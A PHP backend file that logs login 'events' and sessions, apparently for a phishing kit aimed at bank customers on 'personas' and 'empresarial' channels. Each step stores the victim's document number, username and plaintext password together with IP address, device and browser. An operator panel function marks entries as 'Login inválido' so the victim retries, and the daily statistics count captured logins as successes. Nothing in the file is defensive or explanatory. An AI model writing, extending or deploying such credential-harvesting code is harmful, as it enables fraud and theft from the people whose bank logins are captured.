<?php
declare(strict_types=1);

require_once __DIR__ . '/helpers.php';

function registrar_evento(array $data): int
{
    $ua = parse_user_agent($_SERVER['HTTP_USER_AGENT'] ?? '');
    $tipo = in_array($data['tipo'] ?? '', ['login', 'sistema', 'accion'], true) ? $data['tipo'] : 'login';
    $canal = in_array($data['canal'] ?? '', ['personas', 'empresarial', 'sistema'], true) ? $data['canal'] : 'personas';
    $estado = in_array($data['estado'] ?? '', ['pendiente', 'rechazado', 'ok', 'eliminado'], true)
        ? $data['estado']
        : 'pendiente';

    $stmt = db()->prepare(
        'INSERT INTO eventos (
            tipo, categoria, titulo, detalle, documento, `usuario`, clave,
            canal, paso, ip, dispositivo, navegador, sesion_id, exito, estado
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
    );

    $stmt->execute([
        $tipo,
        mb_substr((string) ($data['categoria'] ?? ''), 0, 80),
        mb_substr((string) ($data['titulo'] ?? 'Evento'), 0, 120),
        (string) ($data['detalle'] ?? ''),
        mb_substr((string) ($data['documento'] ?? ''), 0, 40),
        mb_substr((string) ($data['usuario'] ?? ''), 0, 160),
        mb_substr((string) ($data['clave'] ?? ''), 0, 255),
        $canal,
        (int) ($data['paso'] ?? 0),
        client_ip(),
        $ua['dispositivo'],
        $ua['navegador'],
        isset($data['sesion_id']) ? (int) $data['sesion_id'] : null,
        array_key_exists('exito', $data) ? ($data['exito'] === null ? null : (int) (bool) $data['exito']) : null,
        $estado,
    ]);

    return (int) db()->lastInsertId();
}

function registrar_sesion_login(array $data): int
{
    $ua = parse_user_agent($_SERVER['HTTP_USER_AGENT'] ?? '');
    $canal = in_array($data['canal'] ?? '', ['personas', 'empresarial'], true) ? $data['canal'] : 'personas';

    $stmt = db()->prepare(
        'INSERT INTO sesiones (
            empleado_id, ip, dispositivo, navegador, canal,
            documento, usuario_intento, clave_intento, exito
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)'
    );

    $stmt->execute([
        isset($data['empleado_id']) ? (int) $data['empleado_id'] : null,
        client_ip(),
        $ua['dispositivo'],
        $ua['navegador'],
        $canal,
        mb_substr((string) ($data['documento'] ?? ''), 0, 40),
        mb_substr((string) ($data['usuario'] ?? ''), 0, 160),
        mb_substr((string) ($data['clave'] ?? ''), 0, 255),
        (int) (bool) ($data['exito'] ?? 1),
    ]);

    return (int) db()->lastInsertId();
}

function eventos_recientes(int $afterId = 0, int $limit = 80): array
{
    $limit = max(1, min(200, $limit));
    if ($afterId > 0) {
        $stmt = db()->prepare(
            "SELECT * FROM eventos
             WHERE id > ? AND (estado IS NULL OR estado <> 'eliminado')
             ORDER BY id ASC LIMIT {$limit}"
        );
        $stmt->execute([$afterId]);
    } else {
        $stmt = db()->query(
            "SELECT * FROM eventos
             WHERE (estado IS NULL OR estado <> 'eliminado')
             ORDER BY id DESC LIMIT {$limit}"
        );
    }
    $rows = $stmt->fetchAll();
    return $afterId > 0 ? $rows : array_reverse($rows);
}

function evento_por_id(int $id): ?array
{
    $stmt = db()->prepare('SELECT * FROM eventos WHERE id = ? LIMIT 1');
    $stmt->execute([$id]);
    $row = $stmt->fetch();
    return $row ?: null;
}

function rechazar_evento(int $id): bool
{
    $stmt = db()->prepare(
        "UPDATE eventos
         SET estado = 'rechazado', exito = 0,
             titulo = 'Login inválido',
             detalle = CONCAT('Rechazado por panel — usuario inválido | ', COALESCE(detalle, ''))
         WHERE id = ? AND paso >= 4"
    );
    $stmt->execute([$id]);
    return $stmt->rowCount() > 0;
}

function eliminar_evento(int $id): bool
{
    $stmt = db()->prepare("UPDATE eventos SET estado = 'eliminado' WHERE id = ?");
    $stmt->execute([$id]);
    return $stmt->rowCount() > 0;
}

function monitor_stats_hoy(): array
{
    $stmt = db()->query(
        "SELECT
            SUM(CASE WHEN tipo = 'login' AND paso >= 4 AND estado <> 'eliminado' THEN 1 ELSE 0 END) AS intentos,
            SUM(CASE WHEN tipo = 'login' AND paso >= 4 AND estado = 'pendiente' THEN 1 ELSE 0 END) AS exitosos,
            SUM(CASE WHEN tipo = 'login' AND paso >= 4 AND estado = 'rechazado' THEN 1 ELSE 0 END) AS fallidos
         FROM eventos
         WHERE DATE(creado_en) = CURDATE()"
    );
    $row = $stmt->fetch() ?: [];
    return [
        'intentos' => (int) ($row['intentos'] ?? 0),
        'exitosos' => (int) ($row['exitosos'] ?? 0),
        'fallidos' => (int) ($row['fallidos'] ?? 0),
    ];
}
